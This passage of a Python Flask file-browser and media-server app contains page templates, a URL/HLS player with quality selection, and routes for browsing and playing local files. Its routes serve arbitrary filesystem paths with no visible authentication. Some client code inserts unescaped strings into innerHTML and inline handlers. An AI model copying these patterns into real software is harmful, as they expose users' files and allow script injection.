                <input type="text" id="urlInput" class="url-input" placeholder="Paste your video URL here (m3u8, mp4, etc.)...">
                <button class="url-btn" id="playUrlBtn" onclick="playFromUrl()">
                    <span id="playBtnText">Play</span>
                </button>
            </div>
            <div class="url-actions" id="urlActions" style="display: none;">
                <button class="download-btn" onclick="showQualityModal()">
                    <svg viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>
                    Download
                </button>
            </div>
        </div>
        
        <!-- Quality Selection Modal -->
        <div class="quality-modal" id="qualityModal">
            <div class="quality-panel">
                <div class="quality-header">
                    <div class="quality-title">Select Quality</div>
                    <button class="quality-close" onclick="closeQualityModal()">&times;</button>
                </div>
                <div class="quality-list" id="qualityList">
                    <div style="text-align: center; padding: 20px; color: #888;">
                        <div class="loading-spinner"></div>
                        <div style="margin-top: 10px;">Loading qualities...</div>
                    </div>
                </div>
                <div class="download-progress" id="downloadProgress">
                    <div class="progress-text" id="progressText">Downloading...</div>
                    <div class="progress-bar-outer">
                        <div class="progress-bar-inner" id="progressBar"></div>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Continue Watching Section (populated by JS) -->
        <div id="continueWatchingSection" class="home-section" style="display: none;">
            <div class="home-section-header">
                <div class="home-section-title">
                    <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 14.5v-9l6 4.5-6 4.5z"/></svg>
                    Continue Watching
                </div>
                <button class="clear-btn" onclick="clearWatchHistory()">Clear All</button>
            </div>
            <div id="continueWatchingList" class="horizontal-scroll"></div>
        </div>
        
        <!-- Favorites Section (populated by JS) -->
        <div id="favoritesSection" class="home-section" style="display: none;">
            <div class="home-section-header">
                <div class="home-section-title">
                    <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                    Favorites
                </div>
                <button class="clear-btn" onclick="clearFavorites()">Clear All</button>
            </div>
            <div id="favoritesList" class="horizontal-scroll"></div>
        </div>
        
        <div class="stats-bar">
            <div class="stat"><div class="stat-num">{{ folders|length }}</div><div class="stat-label">Folders</div></div>
            <div class="stat"><div class="stat-num">{{ videos|length }}</div><div class="stat-label">Videos</div></div>
            <div class="stat"><div class="stat-num">{{ images|length }}</div><div class="stat-label">Images</div></div>
            <div class="stat"><div class="stat-num">{{ other_files|length }}</div><div class="stat-label">Others</div></div>
        </div>
        {% if folders %}
        <div class="section-title">Folders ({{ folders|length }})</div>
        <div class="file-grid">
            {% for folder in folders %}
            <a href="/?path={{ folder.path_encoded }}" class="file-card">
                <div class="file-card-inner">
                    <div class="file-icon icon-folder">{{ svg_folder|safe }}</div>
                    <div class="file-details">
                        <div class="file-name">{{ folder.name }}</div>
                        <div class="file-meta"><span>{{ folder.item_count }} items</span></div>
                    </div>
                    <span class="badge badge-folder">FOLDER</span>
                </div>
            </a>
            {% endfor %}
        </div>
        {% endif %}
        {% if videos %}
        <div class="section-title">Videos ({{ videos|length }})</div>
        <div class="file-grid">
            {% for video in videos %}
            <a href="/play?file={{ video.path_encoded }}" class="file-card">
                <div class="file-card-inner">
                    <div class="file-icon icon-video">{{ svg_video|safe }}</div>
                    <div class="file-details">
                        <div class="file-name">{{ video.name }}</div>
                        <div class="file-meta"><span>{{ video.size }}</span></div>
                    </div>
                    <span class="badge badge-video">{{ video.ext }}</span>
                </div>
            </a>
            {% endfor %}
        </div>
        {% endif %}
        {% if images %}
        <div class="section-title">Images ({{ images|length }})</div>
        <div class="file-grid">
            {% for img in images %}
            <a href="/view?file={{ img.path_encoded }}" class="file-card">
                <div class="file-card-inner">
                    <div class="file-icon icon-image">{{ svg_image|safe }}</div>
                    <div class="file-details">
                        <div class="file-name">{{ img.name }}</div>
                        <div class="file-meta"><span>{{ img.size }}</span></div>
                    </div>
                    <span class="badge badge-image">{{ img.ext }}</span>
                </div>
            </a>
            {% endfor %}
        </div>
        {% endif %}
        {% if audios %}
        <div class="section-title">Audio ({{ audios|length }})</div>
        <div class="file-grid">
            {% for audio in audios %}
            <a href="/audio?file={{ audio.path_encoded }}" class="file-card">
                <div class="file-card-inner">
                    <div class="file-icon icon-audio">{{ svg_audio|safe }}</div>
                    <div class="file-details">
                        <div class="file-name">{{ audio.name }}</div>
                        <div class="file-meta"><span>{{ audio.size }}</span></div>
                    </div>
                    <span class="badge badge-audio">{{ audio.ext }}</span>
                </div>
            </a>
            {% endfor %}
        </div>
        {% endif %}
        {% if other_files %}
        <div class="section-title">Other Files ({{ other_files|length }})</div>
        <div class="file-grid">
            {% for file in other_files %}
            <a href="/download?file={{ file.path_encoded }}" class="file-card">
                <div class="file-card-inner">
                    <div class="file-icon icon-other">{{ svg_file|safe }}</div>
                    <div class="file-details">
                        <div class="file-name">{{ file.name }}</div>
                        <div class="file-meta"><span>{{ file.size }}</span></div>
                    </div>
                    <span class="badge badge-other">{{ file.ext }}</span>
                </div>
            </a>
            {% endfor %}
        </div>
        {% endif %}
        {% if not folders and not videos and not images and not audios and not other_files %}
        <div class="empty-state">
            <h2>Empty Folder</h2>
            <p>No files or folders found</p>
        </div>
        {% endif %}
        {% if show_hidden_link %}
        <a href="/?path={{ current_path }}&show_hidden=1" class="show-hidden">Show Hidden ({{ hidden_count }})</a>
        {% endif %}
    </div>
    
    <script>
    function formatTime(sec) {
        if (isNaN(sec)) return '0:00';
        const h = Math.floor(sec / 3600);
        const m = Math.floor((sec % 3600) / 60);
        const s = Math.floor(sec % 60);
        if (h > 0) return h + ':' + m.toString().padStart(2,'0') + ':' + s.toString().padStart(2,'0');
        return m + ':' + s.toString().padStart(2,'0');
    }
    
    function getWatchHistory() {
        try {
            return JSON.parse(localStorage.getItem('watchHistory') || '[]');
        } catch { return []; }
    }
    
    function getFavorites() {
        try {
            return JSON.parse(localStorage.getItem('favorites') || '[]');
        } catch { return []; }
    }
    
    function renderContinueWatching() {
        const history = getWatchHistory().filter(h => h.progress < 95);
        const section = document.getElementById('continueWatchingSection');
        const list = document.getElementById('continueWatchingList');
        
        if (history.length === 0) {
            section.style.display = 'none';
            return;
        }
        
        section.style.display = 'block';
        list.innerHTML = history.map((item, idx) => `
            <a href="/play?file=${encodeURIComponent(item.path)}" class="history-card">
                <button class="remove-history-btn" onclick="event.preventDefault(); removeFromHistory(${idx});" title="Remove">&times;</button>
                <div class="history-card-inner">
                    <div class="history-card-icon">
                        <svg viewBox="0 0 24 24"><path d="M18 4l2 4h-3l-2-4h-2l2 4h-3l-2-4H8l2 4H7L5 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4h-4z"/></svg>
                    </div>
                    <div class="history-card-name">${escapeHtml(item.name)}</div>
                    <div class="progress-bar-container">
                        <div class="progress-bar-fill" style="width: ${item.progress}%"></div>
                    </div>
                    <div class="history-card-meta">
                        <span>${formatTime(item.position)} / ${formatTime(item.duration)}</span>
                        <span>${item.progress}%</span>
                    </div>
                </div>
            </a>
        `).join('');
    }
    
    function renderFavorites() {
        const favorites = getFavorites();
        const section = document.getElementById('favoritesSection');
        const list = document.getElementById('favoritesList');
        
        if (favorites.length === 0) {
            section.style.display = 'none';
            return;
        }
        
        section.style.display = 'block';
        list.innerHTML = favorites.map((item, idx) => `
            <a href="/play?file=${encodeURIComponent(item.path)}" class="favorite-card">
                <button class="remove-favorite-btn" onclick="event.preventDefault(); removeFromFavorites(${idx});" title="Remove">&times;</button>
                <div class="favorite-card-inner">
                    <div class="favorite-card-icon">
                        <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
                    </div>
                    <div class="favorite-card-name">${escapeHtml(item.name)}</div>
                </div>
            </a>
        `).join('');
    }
    
    function removeFromHistory(idx) {
        const history = getWatchHistory();
        history.splice(idx, 1);
        localStorage.setItem('watchHistory', JSON.stringify(history));
        renderContinueWatching();
    }
    
    function removeFromFavorites(idx) {
        const favorites = getFavorites();
        favorites.splice(idx, 1);
        localStorage.setItem('favorites', JSON.stringify(favorites));
        renderFavorites();
    }
    
    function clearWatchHistory() {
        if (confirm('Clear all watch history?')) {
            localStorage.setItem('watchHistory', '[]');
            renderContinueWatching();
        }
    }
    
    function clearFavorites() {
        if (confirm('Clear all favorites?')) {
            localStorage.setItem('favorites', '[]');
            renderFavorites();
        }
    }
    
    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
    
    // URL Player Functions
    let currentUrl = '';
    let availableQualities = [];
    
    function playFromUrl() {
        const url = document.getElementById('urlInput').value.trim();
        if (!url) {
            alert('Please enter a video URL');
            return;
        }
        
        currentUrl = url;
        document.getElementById('urlActions').style.display = 'flex';
        
        // Navigate to HLS player
        window.location.href = '/play-url?url=' + encodeURIComponent(url);
    }
    
    function showQualityModal() {
        const url = document.getElementById('urlInput').value.trim();
        if (!url) {
            alert('Please enter a video URL first');
            return;
        }
        
        currentUrl = url;
        document.getElementById('qualityModal').classList.add('show');
        document.getElementById('downloadProgress').classList.remove('show');
        fetchQualities(url);
    }
    
    function closeQualityModal() {
        document.getElementById('qualityModal').classList.remove('show');
    }
    
    async function fetchQualities(url) {
        const qualityList = document.getElementById('qualityList');
        qualityList.innerHTML = `
            <div style="text-align: center; padding: 20px; color: #888;">
                <div class="loading-spinner"></div>
                <div style="margin-top: 10px;">Loading available qualities...</div>
            </div>
        `;
        
        try {
            const response = await fetch('/api/get-qualities?url=' + encodeURIComponent(url));
            const data = await response.json();
            
            if (data.error) {
                qualityList.innerHTML = `<div style="text-align: center; padding: 20px; color: #e94560;">${data.error}</div>`;
                return;
            }
            
            availableQualities = data.qualities;
            
            if (availableQualities.length === 0) {
                qualityList.innerHTML = `
                    <div class="quality-item" onclick="downloadDirect('${url}')">
                        <div class="quality-info">
                            <div class="quality-name">Direct Download</div>
                            <div class="quality-details">Original quality</div>
                        </div>
                        <div class="quality-badge">DOWNLOAD</div>
                    </div>
                `;
                return;
            }
            
            qualityList.innerHTML = availableQualities.map((q, idx) => `
                <div class="quality-item" onclick="selectQuality(${idx})">
                    <div class="quality-info">
                        <div class="quality-name">${q.name}</div>
                        <div class="quality-details">${q.bandwidth ? formatBandwidth(q.bandwidth) : ''} ${q.resolution || ''}</div>
                    </div>
                    <div class="quality-badge">${q.resolution || 'STREAM'}</div>
                </div>
            `).join('');
            
        } catch (e) {
            qualityList.innerHTML = `<div style="text-align: center; padding: 20px; color: #e94560;">Error loading qualities: ${e.message}</div>`;
        }
    }
    
    function formatBandwidth(bw) {
        if (bw > 1000000) return (bw / 1000000).toFixed(1) + ' Mbps';
        if (bw > 1000) return (bw / 1000).toFixed(0) + ' Kbps';
        return bw + ' bps';
    }
    
    function selectQuality(idx) {
        const quality = availableQualities[idx];
        downloadWithQuality(quality);
    }
    
    function downloadDirect(url) {
        const a = document.createElement('a');
        a.href = url;
        a.download = 'video_' + Date.now() + '.mp4';
        a.target = '_blank';
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        closeQualityModal();
    }
    
    function downloadWithQuality(quality) {
        document.getElementById('downloadProgress').classList.add('show');
        document.getElementById('progressText').textContent = 'Starting download...';
        document.getElementById('progressBar').style.width = '0%';
        
        // Create download link
        const downloadUrl = '/api/download-stream?url=' + encodeURIComponent(quality.url || currentUrl) + 
                           '&name=' + encodeURIComponent(quality.name || 'video');
        
        // Open in new tab to trigger download
        window.open(downloadUrl, '_blank');
        
        setTimeout(() => {
            document.getElementById('progressText').textContent = 'Download started in new tab!';
            document.getElementById('progressBar').style.width = '100%';
            setTimeout(() => closeQualityModal(), 2000);
        }, 1000);
    }
    
    // Allow Enter key to trigger play
    document.getElementById('urlInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') playFromUrl();
    });
    
    // Show download button when URL is entered
    document.getElementById('urlInput').addEventListener('input', function() {
        const hasUrl = this.value.trim().length > 0;
        document.getElementById('urlActions').style.display = hasUrl ? 'flex' : 'none';
    });
    
    renderContinueWatching();
    renderFavorites();
    </script>
</body>
</html>
'''

HLS_PLAYER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>HLS Player</title>
    <script src="https://cdn.jsdelivr.net/npm/hls.js@latest"></script>
    <style>
        :root {
            --primary: #e94560;
            --bg: #0a0a0f;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; overflow: hidden; height: 100vh; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .controls {
            position: fixed;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            z-index: 100;
        }
        button {
            background: var(--primary);
            border: none;
            color: white;
            padding: 12px 24px;
            border-radius: 8px;
            margin: 0 5px;
            cursor: pointer;
        }
        .loading {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
        }
    </style>
</head>
<body>
    <video id="video" controls autoplay></video>
    <div class="controls">
        <button onclick="goBack()">← Back</button>
    </div>
    <div class="loading" id="loading">Loading stream...</div>

    <script>
        const video = document.getElementById('video');
        const loading = document.getElementById('loading');
        const videoUrl = {{ video_url | tojson | safe }};
        
        function goBack() {
            window.history.back();
        }
        
        if (Hls.isSupported()) {
            const hls = new Hls();
            hls.loadSource(videoUrl);
            hls.attachMedia(video);
            hls.on(Hls.Events.MANIFEST_PARSED, function() {
                loading.style.display = 'none';
                video.play().catch(e => console.log('Auto-play prevented'));
            });
            hls.on(Hls.Events.ERROR, function(event, data) {
                if (data.fatal) {
                    loading.innerHTML = 'Error loading stream';
                }
            });
        } else if (video.canPlayType('application/vnd.apple.mpegurl')) {
            video.src = videoUrl;
            video.addEventListener('loadedmetadata', function() {
                loading.style.display = 'none';
                video.play();
            });
        } else {
            loading.innerHTML = 'HLS not supported in this browser';
        }
    </script>
</body>
</html>
'''

IMAGE_VIEWER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ file_name }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; min-height: 100vh; color: #fff; font-family: sans-serif; }
        .header {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            padding: 15px 20px;
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .back-btn { background: #e94560; color: #fff; padding: 10px 25px; border-radius: 8px; text-decoration: none; font-weight: 600; }
        .title { flex: 1; font-size: 1.1em; }
        .viewer { width: 100%; height: calc(100vh - 70px); display: flex; align-items: center; justify-content: center; padding: 20px; }
        img { max-width: 100%; max-height: 100%; object-fit: contain; }
    </style>
</head>
<body>
    <div class="header">
        <a href="javascript:history.back()" class="back-btn">Back</a>
        <div class="title">{{ file_name }}</div>
    </div>
    <div class="viewer">
        <img src="/download?file={{ file_path }}" alt="{{ file_name }}">
    </div>
</body>
</html>
'''

AUDIO_PLAYER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ file_name }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; color: #fff; font-family: sans-serif; }
        .header { background: rgba(0,0,0,0.3); padding: 15px 20px; display: flex; align-items: center; gap: 15px; }
        .back-btn { background: #e94560; color: #fff; padding: 10px 25px; border-radius: 8px; text-decoration: none; font-weight: 600; }
        .player-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: calc(100vh - 70px); padding: 20px; }
        .icon { width: 100px; height: 100px; margin-bottom: 30px; fill: #e94560; }
        .title { font-size: 1.5em; margin-bottom: 30px; text-align: center; }
        audio { width: 100%; max-width: 500px; }
    </style>
</head>
<body>
    <div class="header">
        <a href="javascript:history.back()" class="back-btn">Back</a>
    </div>
    <div class="player-container">
        <svg class="icon" viewBox="0 0 24 24"><path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/></svg>
        <div class="title">{{ file_name }}</div>
        <audio controls autoplay>
            <source src="/download?file={{ file_path }}" type="{{ mime_type }}">
        </audio>
    </div>
</body>
</html>
'''

# ==================== ROUTES ====================

@app.route('/')
def index():
    requested_path = request.args.get('path', os.path.expanduser('~'))
    show_hidden = request.args.get('show_hidden', '0') == '1'
    
    if requested_path == '~':
        requested_path = os.path.expanduser('~')
    if not requested_path:
        requested_path = os.path.expanduser('~')
    
    try:
        current_dir = Path(requested_path).resolve()
        if not current_dir.exists():
            current_dir = Path(os.path.expanduser('~'))
    except:
        current_dir = Path(os.path.expanduser('~'))
    
    current_path = str(current_dir)
    parent_path = str(current_dir.parent) if current_path != '/' else '/'
    folders, videos, images, audios, other_files, hidden_count = get_files_and_folders(current_path, show_hidden)
    breadcrumbs = get_breadcrumbs(current_path)
    
    valid_quick_paths = []
    for path, name in QUICK_PATHS:
        check_path = os.path.expanduser(path) if path == '~' else path
        if os.path.exists(check_path):
            valid_quick_paths.append((path, name))
    
    return render_template_string(
        HTML_TEMPLATE,
        folders=folders, videos=videos, images=images, audios=audios, other_files=other_files,
        local_ip=get_local_ip(), port=PORT, current_path=current_path, parent_path=parent_path,
        breadcrumbs=breadcrumbs, quick_paths=valid_quick_paths,
        show_hidden_link=hidden_count > 0 and not show_hidden, hidden_count=hidden_count,
        svg_folder=SVG_ICONS['folder'], svg_video=SVG_ICONS['video'],
        svg_image=SVG_ICONS['image'], svg_audio=SVG_ICONS['audio'], svg_file=SVG_ICONS['file']
    )

@app.route('/play')
def play():
    file_path = request.args.get('file', '')
    if not file_path: abort(404)
    
    file_path = urllib.parse.unquote(file_path)
    full_path = Path(file_path)
    
    try:
        full_path = full_path.resolve()
    except:
        abort(404)
    
    if not full_path.exists() or not is_video_file(full_path.name):
        abort(404)
    
    mime_type, _ = mimetypes.guess_type(str(full_path))
    if not mime_type: mime_type = 'video/mp4'
    
    subtitle_path, subtitle_format = find_subtitle_file(full_path)
    subtitle_url = None
    if subtitle_path:
        subtitle_url = '/subtitle?file=' + urllib.parse.quote(subtitle_path, safe='')
    
    sibling_videos = get_sibling_videos(full_path)
    current_index = -1
    for i, v in enumerate(sibling_videos):
        if v['path'] == str(full_path):
            current_index = i
            break
    
    next_video = None
    if current_index >= 0 and current_index < len(sibling_videos) - 1:
        next_video = sibling_videos[current_index + 1]
    
    import json
    return render_template_string(
        PLAYER_TEMPLATE,
        video_name=full_path.name,
        video_path=urllib.parse.quote(str(full_path), safe=''),
        mime_type=mime_type,
        subtitle_url=subtitle_url,
        subtitle_format=subtitle_format,
        sibling_videos_json=json.dumps(sibling_videos),
        current_video_index=current_index,
        next_video=next_video
    )

PLAYER_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>{{ video_name }}</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; overflow: hidden; height: 100vh; }
        .video-container { position: relative; height: 100vh; background: #000; }
        video { width: 100%; height: 100%; object-fit: contain; }
        .controls {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(0deg, rgba(0,0,0,0.8) 0%, rgba(0,0,0,0) 100%);
            padding: 20px;
            opacity: 0;
            transition: opacity 0.3s;
            z-index: 100;
        }
        .video-container:hover .controls { opacity: 1; }
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.2);
            cursor: pointer;
            margin-bottom: 10px;
        }
        .progress-filled {
            width: 0%;
            height: 100%;
            background: #e94560;
        }
        .button-row {
            display: flex;
            gap: 15px;
            align-items: center;
            justify-content: center;
            flex-wrap: wrap;
        }
        button {
            background: rgba(255,255,255,0.2);
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
        }
        button:hover { background: #e94560; }
        .back-btn { position: fixed; top: 20px; left: 20px; z-index: 200; background: rgba(0,0,0,0.7); padding: 10px 20px; border-radius: 8px; text-decoration: none; color: white; }
        .info { position: fixed; top: 20px; right: 20px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 8px; font-size: 12px; color: #888; z-index: 200; }
        .subtitle-btn, .next-btn, .favorite-btn {
            background: rgba(0,0,0,0.7);
        }
        .subtitle-btn.active { background: #e94560; }
    </style>
</head>
<body>
    <a href="javascript:history.back()" class="back-btn">← Back</a>
    <div class="info">{{ video_name }}</div>
    
    <div class="video-container">
        <video id="video" controls autoplay>
            <source src="/stream?file={{ video_path }}" type="{{ mime_type }}">
            {% if subtitle_url %}
            <track label="Subtitles" kind="subtitles" srclang="en" src="{{ subtitle_url }}" default>
            {% endif %}
        </video>
        <div class="controls">
            <div class="progress-bar" id="progressBar">
                <div class="progress-filled" id="progressFilled"></div>
            </div>
            <div class="button-row">
                <button id="favoriteBtn" class="favorite-btn">❤️ Favorite</button>
                {% if next_video %}
                <a href="/play?file={{ next_video.path_encoded }}" class="next-btn" style="text-decoration: none;"><button>▶ Next</button></a>
                {% endif %}
            </div>
        </div>
    </div>

    <script>
        const video = document.getElementById('video');
        const progressBar = document.getElementById('progressBar');
        const progressFilled = document.getElementById('progressFilled');
        const favoriteBtn = document.getElementById('favoriteBtn');
        
        let saveTimeout = null;
        
        function saveProgress() {
            if (video.duration && !isNaN(video.duration) && video.duration !== Infinity) {
                const progress = (video.currentTime / video.duration) * 100;
                const watchData = {
                    path: "{{ video_path|safe }}",
                    name: "{{ video_name }}",
                    position: video.currentTime,
                    duration: video.duration,
                    progress: progress,
                    timestamp: Date.now()
                };
                
                let history = JSON.parse(localStorage.getItem('watchHistory') || '[]');
                const existingIndex = history.findIndex(h => h.path === watchData.path);
                if (existingIndex >= 0) {
                    history[existingIndex] = watchData;
                } else {
                    history.unshift(watchData);
                    if (history.length > 50) history.pop();
                }
                localStorage.setItem('watchHistory', JSON.stringify(history));
            }
        }
        
        video.addEventListener('timeupdate', () => {
            if (video.duration && !isNaN(video.duration) && video.duration !== Infinity) {
                const percent = (video.currentTime / video.duration) * 100;
                progressFilled.style.width = percent + '%';
                
                if (saveTimeout) clearTimeout(saveTimeout);
                saveTimeout = setTimeout(saveProgress, 3000);
            }
        });
        
        video.addEventListener('ended', () => {
            saveProgress();
            {% if next_video %}
            setTimeout(() => {
                window.location.href = '/play?file={{ next_video.path_encoded }}';
            }, 2000);
            {% endif %}
        });
        
        progressBar.addEventListener('click', (e) => {
            const rect = progressBar.getBoundingClientRect();
            const pos = (e.clientX - rect.left) / rect.width;
            video.currentTime = pos * video.duration;
        });
        
        function checkFavorite() {
            const favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
            const isFavorite = favorites.some(f => f.path === "{{ video_path|safe }}");
            favoriteBtn.textContent = isFavorite ? '❤️ Favorited' : '🤍 Favorite';
            favoriteBtn.style.opacity = isFavorite ? '1' : '0.7';
        }
        
        favoriteBtn.addEventListener('click', () => {
            let favorites = JSON.parse(localStorage.getItem('favorites') || '[]');
            const existingIndex = favorites.findIndex(f => f.path === "{{ video_path|safe }}");
            
            if (existingIndex >= 0) {
                favorites.splice(existingIndex, 1);
                favoriteBtn.textContent = '🤍 Favorite';
                favoriteBtn.style.opacity = '0.7';
            } else {
                favorites.unshift({
                    path: "{{ video_path|safe }}",
                    name: "{{ video_name }}",
                    timestamp: Date.now()
                });
                favoriteBtn.textContent = '❤️ Favorited';
                favoriteBtn.style.opacity = '1';
            }
            localStorage.setItem('favorites', JSON.stringify(favorites));
        });
        
        // Load saved position
        const history = JSON.parse(localStorage.getItem('watchHistory') || '[]');
        const saved = history.find(h => h.path === "{{ video_path|safe }}");
        if (saved && saved.position && saved.position > 0 && saved.position < saved.duration - 10) {
            video.addEventListener('loadedmetadata', () => {
                video.currentTime = saved.position;
            });
        }
        
        checkFavorite();
    </script>
</body>
</html>
'''

@app.route('/play-url')
def play_url():
    video_url = request.args.get('url', '')
    if not video_url:
        return redirect('/')
    
    video_url = urllib.parse.unquote(video_url)
    full_query = request.query_string.decode('utf-8')
    if full_query.startswith('url='):
        video_url = urllib.parse.unquote(full_query[4:])
    
    return render_template_string(HLS_PLAYER_TEMPLATE, video_url=video_url)

def validate_external_url(url):
    try:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in ('http', 'https'):
            return False, 'Only HTTP/HTTPS URLs are allowed'
        hostname = parsed.hostname
        if not hostname:
            return False, 'Invalid URL'
        blocked_hosts = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
        if hostname.lower() in blocked_hosts:
            return False, 'Local URLs are not allowed'
        try:
            ip = ipaddress.ip_address(hostname)
            if ip.is_private or ip.is_loopback or ip.is_reserved or ip.is_link_local:
                return False, 'Private IP addresses are not allowed'
        except ValueError:
            try:
                addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
                for family, type_, proto, canonname, sockaddr in addr_info:
                    ip_str = sockaddr[0]
                    try:
                        ip = ipaddress.ip_address(ip_str)
                        if ip.is_private or ip.is_loopback or ip.is_reserved or ip.is_link_local:
                            return False, 'URL resolves to private IP address'
                    except ValueError:
                        continue
            except socket.gaierror:
                return False, 'Could not resolve hostname'
        return True, None
    except Exception as e:
        return False, f'Invalid URL: {str(e)}'

def resolve_url(base_url, relative_url):
    if relative_url.startswith('http://') or relative_url.startswith('https://'):
        return relative_url
    return urllib.parse.urljoin(base_url, relative_url)

@app.route('/api/get-qualities')
def get_qualities():
    video_url = request.args.get('url', '')
    if not video_url:
        return jsonify({'error': 'No URL provided', 'qualities': []})
    
    full_query = request.query_string.decode('utf-8')
    if full_query.startswith('url='):
        video_url = urllib.parse.unquote(full_query[4:])
    else:
        video_url = urllib.parse.unquote(video_url)
    
    is_valid, error_msg = validate_external_url(video_url)
    if not is_valid:
        return jsonify({'error': error_msg, 'qualities': []})
    
    try:
        if not video_url.endswith('.m3u8') and 'playlist' not in video_url.lower():
            return jsonify({
                'qualities': [{
                    'name': 'Original',
                    'url': video_url,
                    'resolution': 'Original',
                    'bandwidth': None
                }]
            })
        
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Referer': video_url}
        response = requests.get(video_url, headers=headers, timeout=10, stream=True, allow_redirects=False)
        
        redirect_count = 0
        while response.is_redirect and redirect_count < 5:
            redirect_url = response.headers.get('Location')
            if not redirect_url:
                break
            redirect_url = resolve_url(video_url, redirect_url)
            is_valid, error_msg = validate_external_url(redirect_url)
            if not is_valid:
                return jsonify({'error': f'Redirect blocked: {error_msg}', 'qualities': []})
            video_url = redirect_url
            response = requests.get(redirect_url, headers=headers, timeout=10, stream=True, allow_redirects=False)
            redirect_count += 1
        
        response.raise_for_status()
        content_length = response.headers.get('Content-Length')
        if content_length and int(content_length) > 1024 * 1024:
            return jsonify({'error': 'Manifest file too large', 'qualities': []})
        
        content = b''
        size_limit = 1024 * 1024
        total_size = 0
        for chunk in response.iter_content(chunk_size=8192):
            if chunk:
                total_size += len(chunk)
                if total_size > size_limit:
                    return jsonify({'error': 'Manifest file too large', 'qualities': []})
                content += chunk
        
        content = content.decode('utf-8', errors='replace')
        qualities = []
        lines = content.split('\n')
        i = 0
        while i < len(lines):
            line = lines[i].strip()
            if line.startswith('#EXT-X-STREAM-INF:'):
                info = {}
                bw_match = re.search(r'BANDWIDTH=(\d+)', line)
                if bw_match:
                    info['bandwidth'] = int(bw_match.group(1))
                res_match = re.search(r'RESOLUTION=(\d+x\d+)', line)
                if res_match:
                    info['resolution'] = res_match.group(1)
                if i + 1 < len(lines):
                    url_line = lines[i + 1].strip()
                    if url_line and not url_line.startswith('#'):
                        stream_url = resolve_url(video_url, url_line)
                        if info.get('resolution'):
                            height = info['resolution'].split('x')[1]
                            name = f"{height}p"
                        elif info.get('bandwidth'):
                            name = f"{info['bandwidth'] // 1000}kbps"
                        else:
                            name = f"Quality {len(qualities) + 1}"
                        qualities.append({
                            'name': name,
                            'url': stream_url,
                            'resolution': info.get('resolution', ''),
                            'bandwidth': info.get('bandwidth')
                        })
                        i += 1
            i += 1
        
        qualities.sort(key=lambda x: x.get('bandwidth', 0) or 0, reverse=True)
        if not qualities:
            qualities = [{'name': 'Original Stream', 'url': video_url, 'resolution': '', 'bandwidth': None}]
        
        return jsonify({'qualities': qualities})
        
    except requests.Timeout:
        return jsonify({'error': 'Request timed out', 'qualities': []})
    except requests.RequestException as e:
        return jsonify({'error': f'Network error: {str(e)}', 'qualities': []})
    except Exception as e:
        return jsonify({'error': f'Error parsing manifest: {str(e)}', 'qualities': []})

@app.route('/api/download-stream')
def download_stream():
    stream_url = request.args.get('url', '')
    name = request.args.get('name', 'video')
    if not stream_url:
        return jsonify({'error': 'No URL provided'}), 400
    return redirect(f'/api/download/start?url={urllib.parse.quote(stream_url, safe="")}&name={urllib.parse.quote(name, safe="")}')

@app.route('/api/download/start', methods=['GET', 'POST'])
def start_download():
    cleanup_old_downloads()
    if request.method == 'POST':
        data = request.get_json() or {}
